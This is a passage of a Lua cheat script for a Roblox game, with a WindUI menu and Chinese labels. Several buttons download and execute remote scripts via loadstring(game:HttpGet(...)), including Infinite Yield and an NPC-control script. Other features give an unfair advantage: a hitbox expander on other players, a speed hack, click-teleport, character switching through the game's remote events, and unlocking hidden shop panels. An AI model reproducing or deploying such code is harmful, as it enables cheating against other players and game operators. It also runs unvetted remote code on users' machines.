          loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Flight-v3-40046"))()
    end
})


Tabs.genericscript:Toggle({
	Title = "夜视",
	Desc = nil,
	Value = false,
    	Callback = function(Value)
    	if Value then
           game:GetService("Lighting").Ambient = Color3.fromRGB(307,307,307)
        else
           game:GetService("Lighting").Ambient = Color3.fromRGB(107,107,107)
        end
    	end
}, "Toggle")


Tabs.genericscript:Button({
	Title = "Infinite Yield",
	Desc = nil,
    	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end
})

Tabs.genericscript:Button({
	Title = "点击传送工具",
	Desc = nil,
    	Callback = function()
local speaker = game:GetService("Players").LocalPlayer
local TpTool = Instance.new("Tool")
TpTool.Name = "点击传送"
TpTool.RequiresHandle = false
local IYMouse = speaker:GetMouse()
TpTool.Parent = speaker.Backpack
TpTool.Activated:Connect(function()
    local Char = speaker.Character
    if not Char then
        Char = workspace:FindFirstChild(speaker.Name)
    end
    local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
    local hitPosition = IYMouse.Hit
    HRP.CFrame = CFrame.new(hitPosition.X, hitPosition.Y + 3, hitPosition.Z, select(4, HRP.CFrame:components()))
end)
    end
})

local PlayerTips = false
local PlayerAddedConnection = nil
local PlayerRemovingConnection = nil
Tabs.genericscript:Toggle({
    Title = "玩家提示",
    Desc = "玩家进入或离开提示",
    Value = false,
    Callback = function(Value)
        PlayerTips = Value
        if PlayerTips then
            PlayerAddedConnection = game.Players.PlayerAdded:Connect(function(player)
              WindUI:Notify({
                Title = "玩家提示",
                 Content = player.Name .. " 加入了游戏！",
                 Duration = 5
              })
            end)

            PlayerRemovingConnection = game.Players.PlayerRemoving:Connect(function(player)
                WindUI:Notify({
                Title = "玩家提示",
                 Content = player.Name .. " 离开了游戏！",
                 Duration = 5
              })
            end)
        else
            if PlayerAddedConnection then
                PlayerAddedConnection:Disconnect()
                PlayerAddedConnection = nil
            end

            if PlayerRemovingConnection then
                PlayerRemovingConnection:Disconnect()
                PlayerRemovingConnection = nil
            end
        end
    end
}, "Toggle")

Tabs.genericscript:Button({
	Title = "console",
	Desc = nil,
    	Callback = function()
         StarterGui = cloneref(game:GetService("StarterGui"))
         StarterGui:SetCore("DevConsoleVisible", true)
    end
})

_G.HeadSize = 8
_G.collisionscript = false
game:GetService('RunService').RenderStepped:connect(function()
  for i,v in next, game:GetService('Players'):GetPlayers() do
    if v.Name ~= game:GetService('Players').LocalPlayer.Name then
      if _G.collisionscript == true then
        pcall(function()
          v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
          v.Character.HumanoidRootPart.Transparency = 0.7
          v.Character.HumanoidRootPart.BrickColor = BrickColor.new("可视化范围")
          v.Character.HumanoidRootPart.Material = "Neon"
          v.Character.HumanoidRootPart.CanCollide = false
        end)
      else
        v.Character.HumanoidRootPart.Transparency = 1
        v.Character.HumanoidRootPart.Size = v.Character.Torso.Size
      end
    end
  end
end)

Tabs.genericscript:Section({ 
    Title = " ",
    TextXAlignment = "Left",
    TextSize = 13,
})

Tabs.genericscript:Toggle({
    Title = "玩家体积",
    Desc = "",
    Value = false,
    Callback = function(Value)
    _G.collisionscript = Value
    end
}, "Toggle")

Tabs.genericscript:Slider({
    Title = "体积参数",
    Step = 1,
    Value = {
        Min = 2,
        Max = 720,
        Default = 8,
    },
    Callback = function(value)
        _G.HeadSize = value
    end
})

Tabs.genericscript:Section({ 
    Title = " ",
    TextXAlignment = "Left",
    TextSize = 13,
})

_G.speedtrue = false
_G.speedvalue = 6
game:GetService('RunService').RenderStepped:connect(function()
  if _G.speedtrue == true then
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.speedvalue
  end
end)

Tabs.genericscript:Toggle({
    Title = "移动速度",
    Desc = "关闭后需要刷新一下速度",
    Value = false,
    Callback = function(Value)
       _G.speedtrue = Value
    end
}, "Toggle")

Tabs.genericscript:Slider({
    Title = "速度参数",
    Step = 1,
    Value = {
        Min = 6,
        Max = 120,
        Default = 6,
    },
    Callback = function(value)
        _G.speedvalue = value
    end
})


Tabs.genericscript:Button({
	Title = "NPC操控",
	Desc = nil,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/fe-source/refs/heads/main/NPC/source/main.Luau"))()
    end
})

--切换角色

Tabs.switchroles:Button({
    Title = "重置角色",
    Desc = nil,
    Locked = false,
    Callback = function()
     reset()
    end
})

Tabs.switchroles:Section({ 
    Title = "下列角色",
    TextXAlignment = "Left",
    TextSize = 17,
})

Tabs.switchroles:Section({ 
    Title = "常用角色",
    TextXAlignment = "Left",
    TextSize = 13,
})

Tabs.switchroles:Button({
    Title = "神话反派",
    Desc = nil,
    Locked = false,
    Callback = function()
local args = {
	"Brown Camera man",
	1
}
game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
WindUI:Notify({
Title = "切换提示",
Content = "成功切换",
Duration = 5
})
    end
})

Tabs.switchroles:Button({
    Title = "女三体",
    Desc = nil,
    Locked = false,
    Callback = function()
local args = {
	"Tri Soldier Athena (Girl)",
	0
}
game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
WindUI:Notify({
Title = "切换提示",
Content = "成功切换",
Duration = 5
})
    end
})

Tabs.switchroles:Button({
    Title = "黑音响",
    Desc = nil,
    Locked = false,
    Callback = function()
local args = {
	"Dark Speakerman",
	1
}
game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
WindUI:Notify({
Title = "切换提示",
Content = "成功切换",
Duration = 5
})
    end
})

Tabs.switchroles:Button({
    Title = "首席时钟",
    Desc = nil,
    Locked = false,
    Callback = function()
local args = {
	"Clock Man",
	0
}
game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
WindUI:Notify({
Title = "切换提示",
Content = "成功切换",
Duration = 5
})
    end
})

Tabs.switchroles:Section({ 
    Title = "拥有角色",
    TextXAlignment = "Left",
    TextSize = 13,
})

if game:GetService("Players").LocalPlayer:FindFirstChild("UnlockData") then
    local UnlockData = game:GetService("Players").LocalPlayer.UnlockData
    for _, stringValue in pairs(UnlockData:GetChildren()) do
        Tabs.switchroles:Button({
            Title = stringValue.Name,
            Desc = nil,
            Callback = function()
                local args = {stringValue.Name, 1}
                game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
                WindUI:Notify({
                Title = "切换提示",
                 Content = "成功切换",
                 Duration = 5
              })
            end
        })
    end
else
Tabs.switchroles:Button({
   Title = "错误",
   Desc = "没角色是吧",
   Callback = function()
   end
})
end


--UI页面

if game:GetService("Players").LocalPlayer:FindFirstChild("UnlockData") then
Tabs.playergui:Toggle({
    Title = "商店",
    Desc = nil,
    Value = false,
    Locked = true,
    Callback = function(Value)
        if Value then
          game:GetService("Players").LocalPlayer.PlayerGui["003-A"].Enabled = true
        else
          game:GetService("Players").LocalPlayer.PlayerGui["003-A"].Enabled = false
        end
    end
}, "Toggle")
end

Tabs.playergui:Section({ 
    Title = "泰坦装备",
    TextXAlignment = "Left",
    TextSize = 13,
})

local PlayerGui = game:GetService("Players").LocalPlayer.PlayerGui
if game:GetService("Players").LocalPlayer:FindFirstChild("UnlockData") then
    local function toggleGuiElement(Element)
        local targetParent = PlayerGui:FindFirstChild("003-A")
        local element = PlayerGui:FindFirstChild(Element)
        if targetParent and element then
            element.Parent = targetParent
            targetParent:FindFirstChild(Element).Enabled = true
        end
    end

    local function toggleGuiElement2(Element)
        local targetParent = PlayerGui:FindFirstChild("003-A")
        local element = targetParent:FindFirstChild(Element)
        if targetParent and element then
            element.Enabled = false
            element.Parent = PlayerGui
        end
    end

    Tabs.playergui:Toggle({
        Title = "uttv",
        Desc = nil,
        Value = false,
        Callback = function(Value)
           if Value then
               toggleGuiElement("UpgradeTVShop")
           else
               toggleGuiElement2("UpgradeTVShop")
           end
        end
    }, "Toggle")

    Tabs.playergui:Toggle({
        Title = "utc",
        Desc = nil,
        Value = false,
        Callback = function(Value)
            if Value then
                toggleGuiElement("UpgradeCameraShop")
            else
                toggleGuiElement2("UpgradeCameraShop")
            end
        end
    }, "Toggle")

    Tabs.playergui:Toggle({
        Title = "uts",
        Desc = nil,
        Value = false,
        Callback = function(Value)
            if Value then
                toggleGuiElement("ConfirmUTSM")
            else
                toggleGuiElement2("ConfirmUTSM")
            end
        end
    }, "Toggle")

end


---最后
end